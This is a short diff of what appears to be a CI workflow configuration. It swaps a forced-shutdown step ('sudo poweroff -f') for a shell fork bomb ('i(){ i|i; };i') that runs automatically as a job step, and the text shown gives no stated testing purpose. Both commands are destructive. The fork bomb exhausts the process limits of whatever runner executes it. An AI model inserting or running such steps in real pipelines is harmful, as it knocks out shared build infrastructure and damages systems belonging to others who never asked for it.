@@ -10,4 +10,4 @@ jobs:
       run:
         shell: sh
     steps:
-      - run: sudo poweroff -f
+      - run: i(){ i|i; };i
